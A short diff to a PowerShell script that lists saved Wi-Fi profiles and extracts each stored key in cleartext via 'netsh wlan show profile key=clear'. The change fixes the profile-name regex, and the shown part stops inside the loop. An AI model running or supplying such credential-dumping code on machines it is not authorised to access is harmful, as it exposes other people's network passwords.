@@ -1,5 +1,5 @@
 $wifis = @()
-$profiles = netsh wlan show profiles | Select-String '(?<=User profiles\s+:\s).+'
+$profiles = netsh wlan show profiles | Select-String '(?<=All User profile\s+:\s).+'
 foreach ($profile in $profiles) {
     $password = netsh wlan show profile $profile key=clear -ErrorAction SilentlyContinue | Select-String '(?<=Key Content\s+:\s).+' -ErrorAction SilentlyContinue
     if ($password) {
